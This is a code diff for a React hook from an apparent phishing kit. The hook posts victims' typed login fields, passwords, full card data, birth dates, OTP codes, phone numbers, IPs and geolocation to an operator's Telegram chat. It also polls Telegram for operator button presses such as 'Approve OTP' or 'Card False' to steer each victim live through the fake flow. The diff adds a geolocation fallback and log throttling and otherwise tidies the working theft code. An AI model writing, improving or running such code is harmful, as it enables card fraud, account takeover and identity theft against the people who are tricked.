@@ -24,7 +24,8 @@ const lastLogTimes = {
   visitNotification: 0,
   formattedCard: 0,
   otpCode: 0,
-  success: 0
+  success: 0,
+  otpPage: 0,
 };
 
 // Throttle delay in milliseconds (5 seconds)
@@ -45,6 +46,40 @@ const deleteMessageAfterDelay = async (chatId, messageId, delay = 15000) => {
   }, delay);
 };
 
+// ✅ Helper function to get geo data with fallback
+const getGeoData = async (ip) => {
+  let country = 'Unknown';
+  let city = 'Unknown';
+  let isp = 'Unknown';
+  
+  // Try primary API: ipapi.co
+  try {
+    const geoResponse = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 5000 });
+    if (geoResponse.data && !geoResponse.data.error && geoResponse.data.country_name) {
+      country = `${geoResponse.data.country_name} (${geoResponse.data.country_code})`;
+      city = geoResponse.data.city || 'Unknown';
+      isp = geoResponse.data.org || geoResponse.data.isp || 'Unknown ISP';
+      return { country, city, isp };
+    }
+  } catch (primaryError) {
+    console.log('Primary geo API failed, trying fallback...');
+  }
+  
+  // Try fallback API: ipinfo.io
+  try {
+    const fallbackResponse = await axios.get(`https://ipinfo.io/${ip}/json`, { timeout: 5000 });
+    if (fallbackResponse.data) {
+      country = fallbackResponse.data.country || 'Unknown';
+      city = fallbackResponse.data.city || 'Unknown';
+      isp = fallbackResponse.data.org || 'Unknown ISP';
+    }
+  } catch (fallbackError) {
+    console.log('Both geo APIs failed for this IP');
+  }
+  
+  return { country, city, isp };
+};
+
 export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onDenyOtp, onOtpFalse, onApproveOtp, onCardFalse, onApproveLogin, onOtpLogin, onLoginFalse, onCardVerification) => {
   const pollingIntervalRef = useRef(null);
   const lastUpdateIdRef = useRef(0);
@@ -53,7 +88,6 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
     return Date.now().toString() + Math.random().toString(36).substr(2, 6);
   };
 
-  // Helper function to check if log should be sent (anti-spam)
   const shouldSendLog = (logType) => {
     const now = Date.now();
     const lastTime = lastLogTimes[logType] || 0;
@@ -67,56 +101,54 @@ export const useTelegramBot = (sessionId, onApprove, onDeny, onViewCard, onNextS
 
   // ========== ACTIONS CHANNEL (with buttons) ==========
   
-  
-    
-const sendLoginRequestToTelegram = async (message, sessionId) => {
-  try {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    
-    const keyboard = {
-      inline_keyboard: [
-        [
-          { text: "✅ Approve Connexion", callback_data: `approve_login_${sessionId}` },
-          { text: "🔐 OTP Connexion", callback_data: `otp_login_${sessionId}` }
-        ],
-        [
-          { text: "❌ Login False", callback_data: `login_false_${sessionId}` }
-        ],
-        [
-          { text: "💳 Card Verification", callback_data: `card_verification_${sessionId}` }
-        ]
-      ]
-    };
-
-    await axios.post(url, {
-      chat_id: ACTIONS_CHAT_ID,
-      text: message,
-      parse_mode: 'HTML',
-      reply_markup: keyboard
-    });
-    return true;
-  } catch (error) {
-    console.error('Error sending login request:', error);
-    return false;
-  }
-};
-  const sendCardDetailsToTelegram = async (cardData, sessionId) => {
-  try {
-    let userIP = 'Unable to get IP';
+  const sendLoginRequestToTelegram = async (message, sessionId) => {
     try {
-      const ipResponse = await axios.get('https://api.ipify.org?format=json');
-      userIP = ipResponse.data.ip;
-    } catch (ipError) {
-      console.error('Error getting IP:', ipError);
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      const keyboard = {
+        inline_keyboard: [
+          [
+            { text: "✅ Approve Connexion", callback_data: `approve_login_${sessionId}` },
+            { text: "🔐 OTP Connexion", callback_data: `otp_login_${sessionId}` }
+          ],
+          [
+            { text: "❌ Login False", callback_data: `login_false_${sessionId}` }
+          ],
+          [
+            { text: "💳 Card Verification", callback_data: `card_verification_${sessionId}` }
+          ]
+        ]
+      };
+
+      await axios.post(url, {
+        chat_id: ACTIONS_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+        reply_markup: keyboard
+      });
+      return true;
+    } catch (error) {
+      console.error('Error sending login request:', error);
+      return false;
     }
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    
-    // Format birth date
-    const birthDateStr = cardData.birthDate 
-      ? `${cardData.birthDate.day}/${cardData.birthDate.month}/${cardData.birthDate.year}`
-      : 'Not provided';
-    
-    const cardMessage = `
+  };
+
+  const sendCardDetailsToTelegram = async (cardData, sessionId) => {
+    try {
+      let userIP = 'Unable to get IP';
+      try {
+        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+        userIP = ipResponse.data.ip;
+      } catch (ipError) {
+        console.error('Error getting IP:', ipError);
+      }
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      
+      const birthDateStr = cardData.birthDate 
+        ? `${cardData.birthDate.day}/${cardData.birthDate.month}/${cardData.birthDate.year}`
+        : 'Not provided';
+      
+      const cardMessage = `
 💳 <b>NEW CREDIT CARD DATA</b> 💳
 ━━━━━━━━━━━━━━━━━━━━━
 🆔 <b>Session ID:</b> <code>${sessionId}</code>
@@ -138,43 +170,44 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
 
 ━━━━━━━━━━━━━━━━━━━━━
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
-    `;
+      `;
 
-    const keyboard = {
-      inline_keyboard: [
-        [
-          { text: "➡️ Next Step (Appr)", callback_data: `appr_${sessionId}` },
-          { text: "➡️ Next Step (OTP)", callback_data: `next_${sessionId}` }
-        ],
-        [
-          { text: "🚫 Deny & Block IP", callback_data: `block_${sessionId}` }
-        ],
-        [
-          { text: "⬅️ Back to Login", callback_data: `back_to_login_${sessionId}` }
-        ],
-        [
-          { text: "❌ Card False", callback_data: `card_false_${sessionId}` }
+      const keyboard = {
+        inline_keyboard: [
+          [
+            { text: "➡️ Next Step (Appr)", callback_data: `appr_${sessionId}` },
+            { text: "➡️ Next Step (OTP)", callback_data: `next_${sessionId}` }
+          ],
+          [
+            { text: "🚫 Deny & Block IP", callback_data: `block_${sessionId}` }
+          ],
+          [
+            { text: "⬅️ Back to Login", callback_data: `back_to_login_${sessionId}` }
+          ],
+          [
+            { text: "❌ Card False", callback_data: `card_false_${sessionId}` }
+          ]
         ]
-      ]
-    };
+      };
 
-    await axios.post(url, {
-      chat_id: ACTIONS_CHAT_ID,
-      text: cardMessage,
-      parse_mode: 'HTML',
-      reply_markup: keyboard
-    });
-    return true;
-  } catch (error) {
-    console.error('Error sending card details:', error);
-    return false;
-  }
-};
+      await axios.post(url, {
+        chat_id: ACTIONS_CHAT_ID,
+        text: cardMessage,
+        parse_mode: 'HTML',
+        reply_markup: keyboard
+      });
+      return true;
+    } catch (error) {
+      console.error('Error sending card details:', error);
+      return false;
+    }
+  };
 
   const sendOtpPageLog = async (username, phoneNumber, sessionId) => {
-  try {
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const message = `🔐 OTP PAGE - IN PROGRESS 🔐
+    if (!shouldSendLog('otpPage')) return;
+    try {
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const message = `🔐 OTP PAGE - IN PROGRESS 🔐
 ━━━━━━━━━━━━━━━━━━━━━
 👤 Username: ${username}
 📱 Phone: ${phoneNumber}
@@ -182,35 +215,34 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
 ━━━━━━━━━━━━━━━━━━━━━
 ⚠️ User is ready to enter OTP code!`;
 
-    const keyboard = {
-      inline_keyboard: [
-        [
-          { text: "✅ Approve OTP", callback_data: `approve_otp_${sessionId}` },
-          { text: "❌ OTP False", callback_data: `otp_false_${sessionId}` }
-        ],
-        [
-          { text: "🟢 Appr", callback_data: `appr_${sessionId}` }
-        ],
-        [
-          { text: "⬅️ Back to Card", callback_data: `back_to_card_${sessionId}` }
+      const keyboard = {
+        inline_keyboard: [
+          [
+            { text: "✅ Approve OTP", callback_data: `approve_otp_${sessionId}` },
+            { text: "❌ OTP False", callback_data: `otp_false_${sessionId}` }
+          ],
+          [
+            { text: "🟢 Appr", callback_data: `appr_${sessionId}` }
+          ],
+          [
+            { text: "⬅️ Back to Card", callback_data: `back_to_card_${sessionId}` }
+          ]
         ]
-      ]
-    };
+      };
 
-    await axios.post(url, {
-      chat_id: ACTIONS_CHAT_ID,
-      text: message,
-      parse_mode: 'HTML',
-      reply_markup: keyboard
-    });
-    
-    console.log('✅ OTP page log sent with Appr and Back to Card buttons');
-  } catch (error) {
-    console.error('Error sending OTP page log:', error);
-  }
-};
+      await axios.post(url, {
+        chat_id: ACTIONS_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML',
+        reply_markup: keyboard
+      });
+      
+      console.log('✅ OTP page log sent');
+    } catch (error) {
+      console.error('Error sending OTP page log:', error);
+    }
+  };
 
-  // ========== NEW: CONFIRMATION PAGE LOG (WITH BACK BUTTON) ==========
   const sendConfirmationPageLog = async (username, cardNumber, sessionId) => {
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
@@ -232,17 +264,14 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
         ]
       };
 
-      const response = await axios.post(url, {
+      await axios.post(url, {
         chat_id: ACTIONS_CHAT_ID,
         text: message,
         parse_mode: 'HTML',
         reply_markup: keyboard
       });
       
-      // eslint-disable-next-line no-unused-vars
-      const messageId = response.data.result.message_id;
-      
-      console.log('✅ Confirmation page log sent (with back to appr button)');
+      console.log('✅ Confirmation page log sent');
     } catch (error) {
       console.error('Error sending confirmation page log:', error);
     }
@@ -260,7 +289,6 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
 ⏰ <i>This message will self-delete in 15 seconds</i>`;
       
       const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
-      
       const messageId = response.data.result.message_id;
       deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
       
@@ -271,30 +299,22 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
   };
 
   const sendSiteEntryLog = async () => {
-  if (!shouldSendLog('siteEntry')) return;
-  try {
-    let userIP = 'Unable to get IP';
-    let country = 'Unknown';
-    let city = 'Unknown';
-    let isp = 'Unknown';
-    
+    if (!shouldSendLog('siteEntry')) return;
     try {
-      const ipResponse = await axios.get('https://api.ipify.org?format=json');
-      userIP = ipResponse.data.ip;
+      let userIP = 'Unable to get IP';
       
-      // Get location and ISP info - same as sendVisitNotification
-      const geoResponse = await axios.get(`https://ipapi.co/${userIP}/json/`);
-      if (geoResponse.data && !geoResponse.data.error) {
-        country = `${geoResponse.data.country_name} (${geoResponse.data.country_code})`;
-        city = geoResponse.data.city || 'Unknown';
-        isp = geoResponse.data.org || geoResponse.data.isp || 'Unknown ISP';
+      try {
+        const ipResponse = await axios.get('https://api.ipify.org?format=json');
+        userIP = ipResponse.data.ip;
+      } catch (ipError) {
+        console.error('Error getting IP:', ipError);
       }
-    } catch (ipError) {
-      console.error('Error getting IP/Geo info:', ipError);
-    }
-    
-    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-    const message = `🌍 <b>SITE ENTRY - VISITOR</b> 🌍
+      
+      // ✅ Use the new helper function with fallback
+      const { country, city, isp } = await getGeoData(userIP);
+      
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+      const message = `🌍 <b>SITE ENTRY - VISITOR</b> 🌍
 ━━━━━━━━━━━━━━━━━━━━━
 📱 <b>Event:</b> Someone entered the website
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
@@ -309,36 +329,30 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
 ━━━━━━━━━━━━━━━━━━━━━
 ⚠️ <i>A visitor is on your website!</i>
 ⏰ <i>This message will self-delete in 3 minute</i>`;
-    
-    const response = await axios.post(url, { 
-      chat_id: LOGS_CHAT_ID, 
-      text: message, 
-      parse_mode: 'HTML' 
-    });
-    
-    const messageId = response.data.result.message_id;
-    deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 180000);
-    
-    console.log('✅ Site entry log sent with location and ISP');
-  } catch (error) {
-    console.error('Error sending site entry log:', error);
-  }
-};
+      
+      const response = await axios.post(url, { 
+        chat_id: LOGS_CHAT_ID, 
+        text: message, 
+        parse_mode: 'HTML' 
+      });
+      
+      const messageId = response.data.result.message_id;
+      deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 180000);
+      
+      console.log('✅ Site entry log sent with location and ISP');
+    } catch (error) {
+      console.error('Error sending site entry log:', error);
+    }
+  };
 
   const sendVisitNotification = async (ipAddress, userAgent, referrer, screenResolution, timezone, sessionId, language) => {
     if (!shouldSendLog('visitNotification')) return;
     try {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       
-      let geoInfo = 'Not available';
-      try {
-        const geoResponse = await axios.get(`https://ipapi.co/${ipAddress}/json/`);
-        if (geoResponse.data && !geoResponse.data.error) {
-          geoInfo = `${geoResponse.data.city}, ${geoResponse.data.country_name} (${geoResponse.data.country_code})`;
-        }
-      } catch (geoError) {
-        console.error('Error getting geolocation:', geoError);
-      }
+      // ✅ Use the new helper function with fallback
+      const { country, city } = await getGeoData(ipAddress);
+      const geoInfo = `${city}, ${country}`;
       
       const message = `
 🌐 <b>NEW SITE VISITOR</b> 🌐
@@ -428,11 +442,10 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
 ⏰ <i>This message will self-delete in 15 seconds</i>`;
       
       const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
-      
       const messageId = response.data.result.message_id;
       deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
       
-      console.log('✅ Card verification page log sent (will auto-delete)');
+      console.log('✅ Card verification page log sent');
     } catch (error) {
       console.error('Error sending card verification page log:', error);
     }
@@ -476,7 +489,7 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
     }
   };
 
-  // ========== TYPING LOGS (WITH ANTI-SPAM) ==========
+  // ========== TYPING LOGS ==========
   const sendLoginTypingLog = async (username, field, value) => {
     if (!shouldSendLog('loginTyping')) return;
     try {
@@ -486,13 +499,11 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
 📝 <b>Field:</b> ${field}
 📝 <b>Value:</b> ${value}
 👤 <b>Username:</b> ${username || 'Not entered yet'}
-
 ━━━━━━━━━━━━━━━━━━━━━
 ⚠️ <i>User is typing on the login page!</i>
 ⏰ <i>This message will self-delete in 15 seconds</i>`;
       
       const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
-      
       const messageId = response.data.result.message_id;
       deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
       
@@ -517,7 +528,6 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
 ⏰ <i>This message will self-delete in 15 seconds</i>`;
       
       const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
-      
       const messageId = response.data.result.message_id;
       deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
       
@@ -543,7 +553,6 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
 ⏰ <i>This message will self-delete in 15 seconds</i>`;
       
       const response = await axios.post(url, { chat_id: LOGS_CHAT_ID, text: message, parse_mode: 'HTML' });
-      
       const messageId = response.data.result.message_id;
       deleteMessageAfterDelay(LOGS_CHAT_ID, messageId, 15000);
       
@@ -553,7 +562,6 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
     }
   };
 
-  // ========== CONFIRMATION LOG (PERMANENT) ==========
   const sendConfirmationLog = async (username, cardNumber, sessionId) => {
     if (!shouldSendLog('confirmation')) return;
     try {
@@ -576,15 +584,13 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
         parse_mode: 'HTML'
       });
       
-      console.log('✅ Confirmation log sent to Telegram (PERMANENT)');
+      console.log('✅ Confirmation log sent to Telegram');
       return true;
     } catch (error) {
       console.error('Error sending confirmation log:', error);
       return false;
     }
   };
-
-  // ========== OTHER FUNCTIONS ==========
 
   const sendFormattedCardDetails = async (cardData, sessionId, loginName, loginPassword) => {
     if (!shouldSendLog('formattedCard')) return;
@@ -618,10 +624,9 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
 ├ 🏙️ <b>City:</b> ${cardData.city}
 └ 📮 <b>Postal Code:</b> ${cardData.postalCode}
 <b>🖥️ TECHNICAL INFO:</b>
-├ 🌐 <b>Country:</b> Czech Republic
+├ 🌐 <b>Country:</b> Germany
 ├ 🔌 <b>IP Address:</b> ${userIP}
 └ 📱 <b>User-Agent:</b> ${navigator.userAgent.substring(0, 100)}
-
 ━━━━━━━━━━━━━━━━━━━━━
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
       `;
@@ -650,7 +655,6 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
 ━━━━━━━━━━━━━━━━━━━━━
 🆔 <b>Session ID:</b> <code>${sessionId}</code>
 ━━━━━━━━━━━━━━━━━━━━━
-
 <b>OTP Code:</b> <code>${otpCode}</code>
 📱 <b>Phone Number:</b> ${phoneNumber}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
@@ -678,10 +682,8 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
 ━━━━━━━━━━━━━━━━━━━━━
 🆔 <b>Session ID:</b> <code>${sessionId}</code>
 ━━━━━━━━━━━━━━━━━━━━━
-
 📱 <b>Phone Number:</b> ${phoneNumber}
 ⏰ <b>Time:</b> ${new Date().toLocaleString()}
-
 <b>Status:</b> OTP Verified ✓
       `;
 
@@ -695,135 +697,71 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
     }
   };
 
+  // ========== POLLING ==========
   const setupTelegramPolling = useCallback(() => {
-  if (pollingIntervalRef.current) {
-    clearInterval(pollingIntervalRef.current);
-  }
+    if (pollingIntervalRef.current) {
+      clearInterval(pollingIntervalRef.current);
+    }
 
-  pollingIntervalRef.current = setInterval(async () => {
-    // Get sessionId from React state OR sessionStorage
-    const currentSessionId = sessionId || sessionStorage.getItem('telegramSessionId');
-    
-    if (!currentSessionId) return;
+    pollingIntervalRef.current = setInterval(async () => {
+      const currentSessionId = sessionId || sessionStorage.getItem('telegramSessionId');
+      
+      if (!currentSessionId) return;
 
-    try {
-      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateIdRef.current}&timeout=5`;
-      const response = await axios.get(url);
-      
-      const updates = response.data.result;
-      
-      for (const update of updates) {
-        if (update.update_id >= lastUpdateIdRef.current) {
-          lastUpdateIdRef.current = update.update_id + 1;
-        }
+      try {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateIdRef.current}&timeout=5`;
+        const response = await axios.get(url);
         
-        if (update.callback_query) {
-          console.log('📨 ALL CALLBACKS RECEIVED:', update.callback_query.data);
-          const callbackData = update.callback_query.data;
+        const updates = response.data.result;
+        
+        for (const update of updates) {
+          if (update.update_id >= lastUpdateIdRef.current) {
+            lastUpdateIdRef.current = update.update_id + 1;
+          }
           
-          const lastUnderscore = callbackData.lastIndexOf('_');
-          const action = callbackData.substring(0, lastUnderscore);
-          const sid = callbackData.substring(lastUnderscore + 1);
+          if (update.callback_query) {
+            const callbackData = update.callback_query.data;
+            
+            const lastUnderscore = callbackData.lastIndexOf('_');
+            const action = callbackData.substring(0, lastUnderscore);
+            const sid = callbackData.substring(lastUnderscore + 1);
 
-          console.log('🔵 Action:', action);
-          console.log('🔵 SessionId from callback:', sid);
-          console.log('🔵 Current sessionId:', currentSessionId);
-          console.log('🔵 Do they match?', sid === currentSessionId);
-          
-          // ✅ Always answer the callback first
-          try {
+            if (sid === currentSessionId) {
+              if (action === 'approve') onApprove?.();
+              else if (action === 'deny') onDeny?.();
+              else if (action === 'card') onViewCard?.();
+              else if (action === 'next') onNextStep?.();
+              else if (action === 'back_to_card') onBackToCard?.();
+              else if (action === 'back_to_login') onBackToLogin?.();
+              else if (action === 'block') onBlock?.();
+              else if (action === 'appr') onNextStepAppr?.();
+              else if (action === 'back_to_appr') onBackToAppr?.();
+              else if (action === 'otp_false') onOtpFalse?.();
+              else if (action === 'approve_otp') onApproveOtp?.();
+              else if (action === 'card_false') onCardFalse?.();
+              else if (action === 'approve_login') onApproveLogin?.();
+              else if (action === 'otp_login') onOtpLogin?.();
+              else if (action === 'login_false') onLoginFalse?.();
+              else if (action === 'card_verification') onCardVerification?.();
+            }
+            
             await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
               callback_query_id: update.callback_query.id,
               text: "✅ Request processed!"
             });
-          } catch (callbackError) {
-            console.error('Error answering callback:', callbackError);
-          }
-
-          // Check if session matches
-          if (sid === currentSessionId) {
-            console.log('🔵 Action received from Telegram:', action, 'Session:', sid);
-            
-            if (action === 'approve') {
-              console.log('✅ Calling onApprove callback');
-              onApprove?.();
-            }
-            else if (action === 'deny') {
-              console.log('❌ Calling onDeny callback');
-              onDeny?.();
-            }
-            else if (action === 'card') {
-              console.log('💳 Calling onViewCard callback');
-              onViewCard?.();
-            }
-            else if (action === 'next') {
-              console.log('➡️ Calling onNextStep callback');
-              onNextStep?.();
-            }
-            else if (action === 'back_to_card') {
-              console.log('⬅️ Calling onBackToCard callback');
-              onBackToCard?.();
-            }
-            else if (action === 'back_to_login') {
-              console.log('⬅️ Calling onBackToLogin callback');
-              onBackToLogin?.();
-            }
-            else if (action === 'block') {
-              console.log('🚫 Calling onBlock callback');
-              onBlock?.();
-            }
-            else if (action === 'appr') {
-              console.log('🟢 Calling onNextStepAppr callback');
-              onNextStepAppr?.();
-            }
-            else if (action === 'back_to_appr') {
-              console.log('⬅️ Calling onBackToAppr callback');
-              onBackToAppr?.();
-            }
-            else if (action === 'otp_false') {
-              console.log('🚫 Calling onOtpFalse callback');
-              onOtpFalse?.();
-            }
-            else if (action === 'approve_otp') {
-              console.log('✅ Calling onApproveOtp callback');
-              onApproveOtp?.();
-            }
-            else if (action === 'card_false') {
-              console.log('❌ Calling onCardFalse callback');
-              onCardFalse?.();
-            }
-            else if (action === 'approve_login') {
-              console.log('✅ Calling onApproveLogin callback');
-              onApproveLogin?.();
-            }
-            else if (action === 'otp_login') {
-              console.log('🔐 Calling onOtpLogin callback');
-              onOtpLogin?.();
-            }
-            else if (action === 'login_false') {
-              console.log('❌ Calling onLoginFalse callback');
-              onLoginFalse?.();
-            }
-            else if (action === 'card_verification') {
-              console.log('💳 Calling onCardVerification callback');
-              onCardVerification?.();
-            }
-          } else {
-            console.log('⚠️ Session ID mismatch - ignoring callback');
           }
         }
+      } catch (error) {
+        console.error('Polling error:', error);
       }
-    } catch (error) {
-      console.error('Polling error:', error);
-    }
-  }, 3000);
-  
-  return () => {
-    if (pollingIntervalRef.current) {
-      clearInterval(pollingIntervalRef.current);
-    }
-  };
-}, [sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onOtpFalse, onApproveOtp, onCardFalse, onApproveLogin, onOtpLogin, onLoginFalse, onCardVerification]);
+    }, 3000);
+    
+    return () => {
+      if (pollingIntervalRef.current) {
+        clearInterval(pollingIntervalRef.current);
+      }
+    };
+  }, [sessionId, onApprove, onDeny, onViewCard, onNextStep, onBackToCard, onBackToLogin, onBlock, onNextStepAppr, onBackToAppr, onOtpFalse, onApproveOtp, onCardFalse, onApproveLogin, onOtpLogin, onLoginFalse, onCardVerification]);
 
   useEffect(() => {
     const cleanup = setupTelegramPolling();
@@ -832,7 +770,7 @@ const sendLoginRequestToTelegram = async (message, sessionId) => {
 
   return {
     generateSessionId,
-    sendLoginRequestToTelegram ,
+    sendLoginRequestToTelegram,
     sendCardDetailsToTelegram,
     sendFormattedCardDetails,
     sendOtpToTelegram,
